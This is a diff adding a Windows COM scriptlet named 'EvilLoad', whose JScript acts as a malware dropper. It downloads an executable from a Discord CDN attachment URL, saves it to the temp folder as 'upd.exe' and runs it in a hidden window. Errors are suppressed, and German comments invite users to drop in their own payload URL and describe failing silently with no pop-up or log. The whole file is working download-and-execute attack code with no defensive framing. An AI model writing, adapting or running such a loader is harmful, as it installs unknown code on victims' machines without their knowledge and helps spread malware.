@@ -1,0 +1,35 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration progid="EvilLoad" classid="{F0001111-0000-0000-0000-0000FEEDACDC}">
+<implements type="Automation" id="EvilLoad" />
+</registration>
+<script language="JScript">
+<![CDATA[
+try {
+    var shell = new ActiveXObject("WScript.Shell");
+    var http = new ActiveXObject("MSXML2.XMLHTTP");
+    
+    // Deine Payload-URL hier rein (kann .exe, .ps1, .bat, whatever sein)
+    var url = "https://cdn.discordapp.com/attachments/1367499475203129415/1477680254733778976/help.exe?ex=69a5a47a&is=69a452fa&hm=b28f442e873a26b3e944b35935ccd7d71f17bee3179e51bcde7843d0f34a86de&";
+    var tempPath = shell.ExpandEnvironmentStrings("%TEMP%") + "\\upd.exe";
+    
+    http.Open("GET", url, false);
+    http.Send();
+    
+    if (http.Status == 200) {
+        var stream = new ActiveXObject("ADODB.Stream");
+        stream.Type = 1; // adTypeBinary
+        stream.Open();
+        stream.Write(http.responseBody);
+        stream.SaveToFile(tempPath, 2); // adSaveCreateOverWrite
+        stream.Close();
+        
+        // Starte hidden
+        shell.Run('"' + tempPath + '"', 0, false);
+    }
+} catch(e) {
+    // Fail silent – kein Pop-up, kein Log
+}
+]]>
+</script>
+</scriptlet>
